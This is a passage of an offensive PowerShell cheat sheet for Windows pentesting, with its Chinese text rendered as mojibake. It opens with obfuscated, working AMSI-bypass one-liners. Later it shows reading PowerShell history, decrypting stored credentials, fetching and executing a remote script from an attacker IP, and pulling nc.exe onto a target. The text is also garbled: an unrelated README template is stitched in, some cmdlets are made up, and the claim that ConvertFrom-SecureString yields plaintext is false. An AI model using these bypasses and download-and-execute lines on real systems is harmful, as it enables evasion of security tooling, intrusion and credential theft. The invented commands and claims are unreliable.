[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
&( $SHELLid[1]+$SHELlId[13]+'X') (NeW-OBJEct sYStEm.iO.coMPrESSIOn.defLAtEstReam( [iO.meMorYStReAm] [cOnvErt]::froMBaSE64StRINg( 'rVHRasJAEHzvdwhGkBAhLUXwYU7i2aKFq4mQBh8Sc6bBM5HkYmq/vruQfkF7L3s7s8vM3CXv+nRw0bb6kpm7K7UN71ftjJwk1F/WDapjnZdVcZjPo6qku+aRnW0Ic5JlXd10Y4lcNfVFpK1+8gduHPXiEestcggD6WFTiDfIAFkhPiGP+FDCQkbce1j6UErMsFbIesYD3rtCPhOPDgHtKfENecZe0TzVDNRjsRhP6LCpValN/g/GYzZGxlMlXiF9rh6CGISToZ6Nn3+Fp3+XCwtxY5kIlF++cC6S2WIDEfJ7xEPeuMeQdaftPjUdfVLVGTMd2abTk4cf'), [sysTEm.iO.cOmpResSioN.COMprEssiOnMOde]::decOMPRESs ) | foreAch{NeW-OBJEct iO.STREaMREadER( $_ , [teXt.ENCoDiNg]::aScii )}).REadtoenD( )

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
${2}=[Ref].Assembly.GetType('Sy'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQAuAE0A')))+'an'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'m'+'en'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAAuAEEAdQA=')))+'t'+'om'+'at'+'io'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgAuAEEA')))+'ms'+'i'+'U'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAGwA')))+'s')
${1}=${2}.GetField('am'+'s'+'iI'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBpAHQA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAA=')))+'ed','No'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBQAHUA')))+'bl'+'i'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAsAFMA')))+'ta'+'ti'+'c')
${1}.SetValue($null,$true)

# Another Method
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)

# AMSI Bypass in python
https://fluidattacks.com/blog/amsi-bypass-python/

# Testing for Amsi Bypass:
https://github.com/rasta-mouse/AmsiScanBufferBypass

# Amsi-Bypass-Powershell
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

https://blog.f-secure.com/hunting-for-amsi-bypasses/
https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
https://slaeryan.github.io/posts/falcon-zero-alpha.html
```
### AMSIç»•è¿‡2 - æ‰˜ç®¡APIè°ƒç”¨æŒ‚é’©

æŸ¥çœ‹[**æ­¤å¸–å­ä»¥è·å–è¯¦ç»†ä¿¡æ¯**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)å’Œ[**ä»£ç **](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)ã€‚

è¿™ç§æ–°æŠ€æœ¯ä¾èµ–äºå¯¹.NETæ–¹æ³•çš„APIè°ƒç”¨æŒ‚é’©ã€‚äº‹å®è¯æ˜ï¼Œ.NETæ–¹æ³•éœ€è¦åœ¨å†…å­˜ä¸­ç¼–è¯‘ä¸ºæœ¬æœºæœºå™¨æŒ‡ä»¤ï¼Œè¿™äº›æŒ‡ä»¤çœ‹èµ·æ¥ä¸æœ¬æœºæ–¹æ³•éå¸¸ç›¸ä¼¼ã€‚è¿™äº›ç¼–è¯‘åçš„æ–¹æ³•å¯ä»¥è¢«æŒ‚é’©ä»¥æ”¹å˜ç¨‹åºçš„æ§åˆ¶æµã€‚

æ‰§è¡Œå¯¹.NETæ–¹æ³•çš„APIè°ƒç”¨æŒ‚é’©çš„æ­¥éª¤å¦‚ä¸‹ï¼š

1. ç¡®å®šè¦æŒ‚é’©çš„ç›®æ ‡æ–¹æ³•
2. å®šä¹‰ä¸€ä¸ªä¸ç›®æ ‡æ–¹æ³•å…·æœ‰ç›¸åŒå‡½æ•°åŸå‹çš„æ–¹æ³•
3. ä½¿ç”¨åå°„æ‰¾åˆ°è¿™äº›æ–¹æ³•
4. ç¡®ä¿æ¯ä¸ªæ–¹æ³•å·²ç»è¢«ç¼–è¯‘
5. æ‰¾åˆ°æ¯ä¸ªæ–¹æ³•åœ¨å†…å­˜ä¸­çš„ä½ç½®
6. ç”¨æŒ‡å‘æˆ‘ä»¬æ¶æ„æ–¹æ³•çš„æŒ‡ä»¤è¦†ç›–ç›®æ ‡æ–¹æ³•

## PS-History
```powershell
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
## è·å–æƒé™

To perform various actions on a Windows system, it is often necessary to have the appropriate permissions. In this section, we will explore how to use PowerShell to check and modify permissions.

### Checking Permissions

To check the permissions of a file or directory, we can use the `Get-Acl` cmdlet. This cmdlet retrieves the access control list (ACL) for the specified object.

```powershell
Get-Acl -Path C:\path\to\file.txt
```

This command will display the permissions associated with the specified file.

### Modifying Permissions

To modify permissions, we can use the `Set-Acl` cmdlet. This cmdlet allows us to change the ACL of a file or directory.

```powershell
Set-Acl -Path C:\path\to\file.txt -AclObject $acl
```

In this command, `$acl` represents the new ACL that we want to apply to the file.

### Taking Ownership

Sometimes, it may be necessary to take ownership of a file or directory in order to modify its permissions. To do this, we can use the `Take-Ownership` function.

```powershell
Take-Ownership -Path C:\path\to\file.txt
```

This function will change the ownership of the specified file to the current user.

### Summary

In this section, we have learned how to use PowerShell to check and modify permissions on a Windows system. By understanding and manipulating permissions, we can gain greater control over the system and perform various actions as needed.
```powershell
Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```
## æ“ä½œç³»ç»Ÿç‰ˆæœ¬å’Œçƒ­è¡¥ä¸

To gather information about the operating system version and installed hotfixes, you can use the following PowerShell commands:

```powershell
# Get the operating system version
(Get-WmiObject -Class Win32_OperatingSystem).Caption

# Get the installed hotfixes
Get-HotFix
```

The first command retrieves the operating system version using the `Win32_OperatingSystem` class. The `Caption` property contains the name of the operating system.

The second command retrieves the installed hotfixes using the `Get-HotFix` cmdlet. This cmdlet provides information about the hotfixes installed on the system, including the hotfix ID, description, and installation date.

By running these commands, you can gather important information about the operating system version and any installed hotfixes, which can be useful for vulnerability assessment and system hardening.
```powershell
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
## ç¯å¢ƒ

---

## Prerequisites

### Windows

- Windows 10 or Windows Server 2016/2019
- PowerShell 5.1 or later

### PowerShell Execution Policy

Before running any PowerShell scripts, you need to set the execution policy to allow script execution. Open a PowerShell session as an administrator and run the following command:

```powershell
Set-ExecutionPolicy Unrestricted
```

---

## å…ˆå†³æ¡ä»¶

### Windows

- Windows 10 æˆ– Windows Server 2016/2019
- PowerShell 5.1 æˆ–æ›´é«˜ç‰ˆæœ¬

### PowerShell æ‰§è¡Œç­–ç•¥

åœ¨è¿è¡Œä»»ä½• PowerShell è„šæœ¬ä¹‹å‰ï¼Œæ‚¨éœ€è¦è®¾ç½®æ‰§è¡Œç­–ç•¥ä»¥å…è®¸è„šæœ¬æ‰§è¡Œã€‚ä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€ PowerShell ä¼šè¯ï¼Œå¹¶è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Set-ExecutionPolicy Unrestricted
```

---

## Installation

1. Clone the repository:

```bash
git clone https://github.com/username/repo.git
```

2. Change into the project directory:

```bash
cd repo
```

3. Install the required dependencies:

```bash
pip install -r requirements.txt
```

---

## å®‰è£…

1. å…‹éš†å­˜å‚¨åº“ï¼š

```bash
git clone https://github.com/username/repo.git
```

2. åˆ‡æ¢åˆ°é¡¹ç›®ç›®å½•ï¼š

```bash
cd repo
```

3. å®‰è£…æ‰€éœ€çš„ä¾èµ–é¡¹ï¼š

```bash
pip install -r requirements.txt
```

---

## Usage

1. Open a PowerShell session.

2. Change into the project directory:

```powershell
cd path/to/project
```

3. Run the PowerShell script:

```powershell
.\script.ps1
```

---

## ç”¨æ³•

1. æ‰“å¼€ PowerShell ä¼šè¯ã€‚

2. åˆ‡æ¢åˆ°é¡¹ç›®ç›®å½•ï¼š

```powershell
cd path/to/project
```

3. è¿è¡Œ PowerShell è„šæœ¬ï¼š

```powershell
.\script.ps1
```

---

## Contributing

Contributions are welcome! For major changes, please open an issue first to discuss what you would like to change.

---

## è´¡çŒ®

æ¬¢è¿è´¡çŒ®ï¼å¯¹äºé‡å¤§æ›´æ”¹ï¼Œè¯·å…ˆæ‰“å¼€ä¸€ä¸ªé—®é¢˜ä»¥è®¨è®ºæ‚¨æƒ³è¦æ›´æ”¹çš„å†…å®¹ã€‚

---
```powershell
Get-ChildItem Env: | ft Key,Value #get all values
$env:UserName @Get UserName value
```
## å…¶ä»–å·²è¿æ¥çš„é©±åŠ¨å™¨

When conducting a penetration test on a Windows system, it is important to gather as much information as possible about the target. One valuable piece of information is the list of connected drives on the system. This can help identify additional storage devices or network shares that may contain sensitive data.

In PowerShell, you can use the `Get-PSDrive` cmdlet to retrieve a list of all connected drives. This cmdlet provides information about both local and remote drives, including drive letters, drive types, and the root directory of each drive.

To retrieve the list of connected drives, open a PowerShell session and run the following command:

```powershell
Get-PSDrive
```

This will display a table with information about each drive, including the drive letter, drive type, and root directory. The drive type can be one of the following:

- **FileSystem**: This indicates a local disk drive.
- **Registry**: This indicates a registry hive.
- **Alias**: This indicates a PowerShell alias.
- **Variable**: This indicates a PowerShell variable.
- **Function**: This indicates a PowerShell function.
- **Certificate**: This indicates a certificate store.
- **Environment**: This indicates an environment variable.

By examining the list of connected drives, you can identify any additional storage devices or network shares that may be of interest during your penetration test. This information can help you further explore the target system and potentially discover vulnerabilities or sensitive data.
```powershell
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
### å›æ”¶ç«™

The Recycle Bin is a feature in Windows that allows users to temporarily store deleted files and folders. Instead of permanently deleting files, they are moved to the Recycle Bin where they can be easily restored if needed. This provides a safety net for users who accidentally delete important files.

The Recycle Bin can be accessed by double-clicking on its icon on the desktop or by opening the File Explorer and navigating to the Recycle Bin folder. Once inside the Recycle Bin, users can browse through the deleted files and folders, and choose to restore them to their original location or permanently delete them.

It is important to note that the Recycle Bin has a storage limit, and once it reaches its maximum capacity, older files will be automatically deleted to make room for new ones. Therefore, it is recommended to regularly empty the Recycle Bin to free up disk space.

As a pentester, it is crucial to be aware of the Recycle Bin as it can potentially contain sensitive information that has been deleted by the user. By accessing the Recycle Bin, a pentester may be able to recover deleted files and gain valuable insights or leverage them for further exploitation.
```powershell
$shell = New-Object -com shell.application
$rb = $shell.Namespace(10)
$rb.Items()
```
[https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/](https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/)

## åŸŸåä¾¦æŸ¥

{% content-ref url="powerview.md" %}
[powerview.md](powerview.md)
{% endcontent-ref %}

## ç”¨æˆ·
```powershell
Get-LocalUser | ft Name,Enabled,Description,LastLogon
Get-ChildItem C:\Users -Force | select Name
```
## å°†å®‰å…¨å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ˜æ–‡

When performing penetration testing or other security assessments, it is common to encounter scenarios where sensitive information, such as passwords or encryption keys, is stored as secure strings in PowerShell scripts or configurations. Secure strings are encrypted and can only be decrypted on the same machine and by the same user who encrypted them.

åœ¨è¿›è¡Œæ¸—é€æµ‹è¯•æˆ–å…¶ä»–å®‰å…¨è¯„ä¼°æ—¶ï¼Œç»å¸¸ä¼šé‡åˆ°å°†æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚å¯†ç æˆ–åŠ å¯†å¯†é’¥ï¼‰å­˜å‚¨ä¸ºå®‰å…¨å­—ç¬¦ä¸²çš„ PowerShell è„šæœ¬æˆ–é…ç½®çš„æƒ…å†µã€‚å®‰å…¨å­—ç¬¦ä¸²æ˜¯åŠ å¯†çš„ï¼Œåªèƒ½åœ¨åŒä¸€å°è®¡ç®—æœºä¸Šç”±åŒä¸€ç”¨æˆ·è§£å¯†ã€‚

To extract the plaintext value from a secure string, you can use the `ConvertFrom-SecureString` cmdlet in PowerShell. This cmdlet converts the secure string into an encrypted standard string representation. However, this representation is specific to the user and machine that performed the conversion.

è¦ä»å®‰å…¨å­—ç¬¦ä¸²ä¸­æå–æ˜æ–‡å€¼ï¼Œå¯ä»¥ä½¿ç”¨ PowerShell ä¸­çš„ `ConvertFrom-SecureString` å‘½ä»¤ã€‚è¯¥å‘½ä»¤å°†å®‰å…¨å­—ç¬¦ä¸²è½¬æ¢ä¸ºåŠ å¯†çš„æ ‡å‡†å­—ç¬¦ä¸²è¡¨ç¤ºã€‚ä½†æ˜¯ï¼Œæ­¤è¡¨ç¤ºä»…é€‚ç”¨äºæ‰§è¡Œè½¬æ¢çš„ç”¨æˆ·å’Œè®¡ç®—æœºã€‚

Here is an example of how to use the `ConvertFrom-SecureString` cmdlet:

ä»¥ä¸‹æ˜¯ä½¿ç”¨ `ConvertFrom-SecureString` å‘½ä»¤çš„ç¤ºä¾‹ï¼š

```powershell
$secureString = Read-Host -AsSecureString
$plainText = $secureString | ConvertFrom-SecureString
$plainText
```

In this example, the `Read-Host` cmdlet is used to securely prompt the user for a password and store it as a secure string in the `$secureString` variable. Then, the `ConvertFrom-SecureString` cmdlet is used to convert the secure string into a plaintext representation, which is stored in the `$plainText` variable. Finally, the plaintext value is displayed.

åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œä½¿ç”¨ `Read-Host` å‘½ä»¤ä»¥å®‰å…¨æ–¹å¼æç¤ºç”¨æˆ·è¾“å…¥å¯†ç ï¼Œå¹¶å°†å…¶ä½œä¸ºå®‰å…¨å­—ç¬¦ä¸²å­˜å‚¨åœ¨ `$secureString` å˜é‡ä¸­ã€‚ç„¶åï¼Œä½¿ç”¨ `ConvertFrom-SecureString` å‘½ä»¤å°†å®‰å…¨å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ˜æ–‡è¡¨ç¤ºï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨ `$plainText` å˜é‡ä¸­ã€‚æœ€åï¼Œæ˜¾ç¤ºæ˜æ–‡å€¼ã€‚

It is important to note that extracting the plaintext value from a secure string should only be done when necessary and with caution, as it can expose sensitive information. Additionally, the plaintext value should be handled securely and not stored in plain text.

éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåªæœ‰åœ¨å¿…è¦æ—¶å¹¶ä¸”è°¨æ…åœ°æå–å®‰å…¨å­—ç¬¦ä¸²çš„æ˜æ–‡å€¼ï¼Œå› ä¸ºå®ƒå¯èƒ½ä¼šæš´éœ²æ•æ„Ÿä¿¡æ¯ã€‚æ­¤å¤–ï¼Œæ˜æ–‡å€¼åº”è¯¥ä»¥å®‰å…¨çš„æ–¹å¼å¤„ç†ï¼Œä¸åº”ä»¥æ˜æ–‡å½¢å¼å­˜å‚¨ã€‚
```powershell
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring
$user = "HTB\Tom"
$cred = New-Object System.management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
æˆ–è€…ç›´æ¥è§£æXMLè¡¨å•ï¼š
```powershell
$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
## SUDO

SUDO æ˜¯ä¸€ç§åœ¨ Linux å’Œ Unix ç³»ç»Ÿä¸Šä½¿ç”¨çš„å‘½ä»¤ï¼Œå®ƒå…è®¸æ™®é€šç”¨æˆ·ä»¥è¶…çº§ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œç‰¹æƒå‘½ä»¤ã€‚è¿™å¯¹äºç³»ç»Ÿç®¡ç†å‘˜å’Œå®‰å…¨ä¸“ä¸šäººå‘˜æ¥è¯´éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒæä¾›äº†ä¸€ç§é™åˆ¶ç”¨æˆ·æƒé™çš„æ–¹æ³•ï¼Œä»¥é˜²æ­¢æ»¥ç”¨å’Œæ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚

SUDO çš„åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š

```
sudo [é€‰é¡¹] å‘½ä»¤
```

å…¶ä¸­ï¼Œ`é€‰é¡¹` æ˜¯ä¸€äº›å¯é€‰å‚æ•°ï¼Œ`å‘½ä»¤` æ˜¯è¦æ‰§è¡Œçš„ç‰¹æƒå‘½ä»¤ã€‚

ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ SUDO é€‰é¡¹ï¼š

- `-u`ï¼šæŒ‡å®šè¦ä»¥å“ªä¸ªç”¨æˆ·çš„èº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚
- `-l`ï¼šåˆ—å‡ºå½“å‰ç”¨æˆ·å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤ã€‚
- `-i`ï¼šä»¥ç›®æ ‡ç”¨æˆ·çš„èº«ä»½å¯åŠ¨ä¸€ä¸ªæ–°çš„ shellã€‚
- `-s`ï¼šä»¥ç›®æ ‡ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œå‘½ä»¤ï¼Œä½†ä¿ç•™å½“å‰ç”¨æˆ·çš„ç¯å¢ƒå˜é‡ã€‚

ä½¿ç”¨ SUDO æ—¶ï¼Œéœ€è¦è¾“å…¥å½“å‰ç”¨æˆ·çš„å¯†ç æ¥éªŒè¯èº«ä»½ã€‚å¦‚æœéªŒè¯æˆåŠŸï¼Œå°±å¯ä»¥æ‰§è¡Œç‰¹æƒå‘½ä»¤ã€‚

SUDO è¿˜å¯ä»¥é€šè¿‡é…ç½®æ–‡ä»¶ `/etc/sudoers` è¿›è¡Œè‡ªå®šä¹‰è®¾ç½®ã€‚è¯¥æ–‡ä»¶å®šä¹‰äº†å“ªäº›ç”¨æˆ·å¯ä»¥ä½¿ç”¨ SUDOï¼Œä»¥åŠå¯ä»¥æ‰§è¡Œå“ªäº›å‘½ä»¤ã€‚

åœ¨è¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ï¼ŒSUDO æ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„å·¥å…·ï¼Œå› ä¸ºå®ƒå¯ä»¥å¸®åŠ©æˆ‘ä»¬ä»¥è¶…çº§ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œå‘½ä»¤ï¼Œä»è€Œè·å–æ›´é«˜çš„æƒé™å’Œè®¿é—®ç³»ç»Ÿçš„æ•æ„Ÿä¿¡æ¯ã€‚ç„¶è€Œï¼Œä½¿ç”¨ SUDO æ—¶éœ€è¦è°¨æ…ï¼Œç¡®ä¿åªæ‰§è¡Œå¿…è¦çš„å‘½ä»¤ï¼Œå¹¶é¿å…æ»¥ç”¨æƒé™ã€‚
```powershell
#CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)

#For local:
Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"

#For WINRM
#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
#DOWNLOAD nc.exe
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri 10.10.14.17/nc.exe -outfile nc.exe } -credential $cred

Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process C:\xyz\nc.bat -verb Runas}'

#Another method
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
```
## ç”¨æˆ·ç»„

In Windows, user groups are used to manage and control access to resources. Each user account is assigned to one or more groups, and these groups determine the permissions and privileges that the user has on the system.

åœ¨Windowsä¸­ï¼Œç”¨æˆ·ç»„ç”¨äºç®¡ç†å’Œæ§åˆ¶å¯¹èµ„æºçš„è®¿é—®ã€‚æ¯ä¸ªç”¨æˆ·å¸æˆ·éƒ½åˆ†é…ç»™ä¸€ä¸ªæˆ–å¤šä¸ªç»„ï¼Œè¿™äº›ç»„ç¡®å®šç”¨æˆ·åœ¨ç³»ç»Ÿä¸Šæ‹¥æœ‰çš„æƒé™å’Œç‰¹æƒã€‚

### Built-in Groups

### å†…ç½®ç»„

Windows includes several built-in groups that have predefined permissions and privileges. These groups are created during the installation of the operating system and are used to manage various aspects of the system.

WindowsåŒ…å«å‡ ä¸ªå†…ç½®ç»„ï¼Œè¿™äº›ç»„å…·æœ‰é¢„å®šä¹‰çš„æƒé™å’Œç‰¹æƒã€‚è¿™äº›ç»„åœ¨æ“ä½œç³»ç»Ÿå®‰è£…è¿‡ç¨‹ä¸­åˆ›å»ºï¼Œå¹¶ç”¨äºç®¡ç†ç³»ç»Ÿçš„å„ä¸ªæ–¹é¢ã€‚

Here are some commonly used built-in groups:

ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„å†…ç½®ç»„ï¼š

- Administrators: This group has full control over the system and can perform any administrative task.

- Administratorsï¼šè¯¥ç»„å¯¹ç³»ç»Ÿæ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒï¼Œå¹¶å¯ä»¥æ‰§è¡Œä»»ä½•ç®¡ç†ä»»åŠ¡ã€‚

- Users: This group includes all standard user accounts and has limited privileges.

- Usersï¼šè¯¥ç»„åŒ…æ‹¬æ‰€æœ‰æ ‡å‡†ç”¨æˆ·å¸æˆ·ï¼Œå¹¶å…·æœ‰æœ‰é™çš„ç‰¹æƒã€‚

- Guests: This group provides limited access to the system and is intended for temporary or guest users.

- Guestsï¼šè¯¥ç»„ä¸ºç³»ç»Ÿæä¾›æœ‰é™è®¿é—®æƒé™ï¼Œé€‚ç”¨äºä¸´æ—¶æˆ–è®¿å®¢ç”¨æˆ·ã€‚

- Power Users: This group has additional privileges compared to standard users, but less than administrators.

- Power Usersï¼šè¯¥ç»„ç›¸æ¯”äºæ ‡å‡†ç”¨æˆ·å…·æœ‰é¢å¤–çš„ç‰¹æƒï¼Œä½†æ¯”ç®¡ç†å‘˜å°‘ã€‚

### Creating and Managing Groups

### åˆ›å»ºå’Œç®¡ç†ç»„

In addition to the built-in groups, you can also create your own custom groups to manage access to specific resources or perform certain tasks.

é™¤äº†å†…ç½®ç»„å¤–ï¼Œæ‚¨è¿˜å¯ä»¥åˆ›å»ºè‡ªå·±çš„è‡ªå®šä¹‰ç»„ï¼Œä»¥ç®¡ç†å¯¹ç‰¹å®šèµ„æºçš„è®¿é—®æˆ–æ‰§è¡ŒæŸäº›ä»»åŠ¡ã€‚

To create a new group, you can use the PowerShell `New-LocalGroup` cmdlet. For example, to create a group named "Developers", you can run the following command:

è¦åˆ›å»ºä¸€ä¸ªæ–°ç»„ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨PowerShellçš„`New-LocalGroup`å‘½ä»¤ã€‚ä¾‹å¦‚ï¼Œè¦åˆ›å»ºä¸€ä¸ªåä¸ºâ€œDevelopersâ€çš„ç»„ï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
New-LocalGroup -Name "Developers"
```

Once the group is created, you can add users to it using the `Add-LocalGroupMember` cmdlet. For example, to add a user named "John" to the "Developers" group, you can run the following command:

åˆ›å»ºç»„åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨`Add-LocalGroupMember`å‘½ä»¤å°†ç”¨æˆ·æ·»åŠ åˆ°ç»„ä¸­ã€‚ä¾‹å¦‚ï¼Œè¦å°†åä¸ºâ€œJohnâ€çš„ç”¨æˆ·æ·»åŠ åˆ°â€œDevelopersâ€ç»„ä¸­ï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Add-LocalGroupMember -Group "Developers" -Member "John"
```

You can also manage group membership using the `Get-LocalGroupMember`, `Remove-LocalGroupMember`, and `Set-LocalGroup` cmdlets.

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨`Get-LocalGroupMember`ã€`Remove-LocalGroupMember`å’Œ`Set-LocalGroup`å‘½ä»¤ç®¡ç†ç»„æˆå‘˜èµ„æ ¼ã€‚

### Group Policy

### ç»„ç­–ç•¥

Group Policy is a feature in Windows that allows you to manage and control the settings of multiple computers in a network. It can be used to enforce security policies, configure system settings, and deploy software.

ç»„ç­–ç•¥æ˜¯Windowsä¸­çš„ä¸€é¡¹åŠŸèƒ½ï¼Œå…è®¸æ‚¨ç®¡ç†å’Œæ§åˆ¶ç½‘ç»œä¸­å¤šå°è®¡ç®—æœºçš„è®¾ç½®ã€‚å®ƒå¯ä»¥ç”¨äºå¼ºåˆ¶æ‰§è¡Œå®‰å…¨ç­–ç•¥ã€é…ç½®ç³»ç»Ÿè®¾ç½®å’Œéƒ¨ç½²è½¯ä»¶ã€‚

Group Policy settings are stored in Group Policy Objects (GPOs), which can be linked to sites, domains, or organizational units (OUs) in Active Directory.

ç»„ç­–ç•¥è®¾ç½®å­˜å‚¨åœ¨ç»„ç­–ç•¥å¯¹è±¡ï¼ˆGPOï¼‰ä¸­ï¼Œå¯ä»¥å°†å…¶é“¾æ¥åˆ°Active Directoryä¸­çš„ç«™ç‚¹ã€åŸŸæˆ–ç»„ç»‡å•ä½ï¼ˆOUï¼‰ã€‚

To manage Group Policy settings, you can use the `Set-GPRegistryValue`, `Set-GPRegistryPolicy`, and `Set-GPPermission` cmdlets in PowerShell.

è¦ç®¡ç†ç»„ç­–ç•¥è®¾ç½®ï¼Œå¯ä»¥ä½¿ç”¨PowerShellä¸­çš„`Set-GPRegistryValue`ã€`Set-GPRegistryPolicy`å’Œ`Set-GPPermission`å‘½ä»¤ã€‚

For example, to set a registry value in a Group Policy Object, you can run the following command:

ä¾‹å¦‚ï¼Œè¦åœ¨ç»„ç­–ç•¥å¯¹è±¡ä¸­è®¾ç½®æ³¨å†Œè¡¨å€¼ï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Set-GPRegistryValue -Name "GPO1" -Key "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" -ValueName "DisableTaskMgr" -Type DWORD -Value 1
```

This command sets the registry value "DisableTaskMgr" to 1 in the specified Group Policy Object.

æ­¤å‘½ä»¤å°†æŒ‡å®šçš„ç»„ç­–ç•¥å¯¹è±¡ä¸­çš„æ³¨å†Œè¡¨å€¼â€œDisableTaskMgrâ€è®¾ç½®ä¸º1ã€‚

Note that managing Group Policy requires administrative privileges on the domain controller or the computer where the Group Policy Management feature is installed.

è¯·æ³¨æ„ï¼Œç®¡ç†ç»„ç­–ç•¥éœ€è¦åœ¨åŸŸæ§åˆ¶å™¨æˆ–å®‰è£…äº†ç»„ç­–ç•¥ç®¡ç†åŠŸèƒ½çš„è®¡ç®—æœºä¸Šå…·æœ‰ç®¡ç†å‘˜ç‰¹æƒã€‚
```powershell
Get-LocalGroup | ft Name #All groups
Get-LocalGroupMember Administrators | ft Name, PrincipalSource #Members of Administrators
```
## å‰ªè´´æ¿

The clipboard is a temporary storage area in the computer's memory that allows you to copy and paste text, images, and other data between different applications or within the same application. It is a useful feature that makes it easy to transfer information without having to retype or reformat it.

In the context of pentesting, the clipboard can be a valuable source of information. When users copy sensitive data, such as passwords or credit card numbers, it is temporarily stored in the clipboard. As a pentester, you can leverage this to your advantage by monitoring the clipboard for any valuable information that may have been copied.

There are various ways to access the clipboard using PowerShell. The `Get-Clipboard` cmdlet allows you to retrieve the contents of the clipboard, while the `Set-Clipboard` cmdlet allows you to set the contents of the clipboard. You can also use the `Add-ClipboardText` cmdlet to add text to the clipboard without replacing the existing contents.

Here are some examples of how you can use PowerShell to interact with the clipboard:

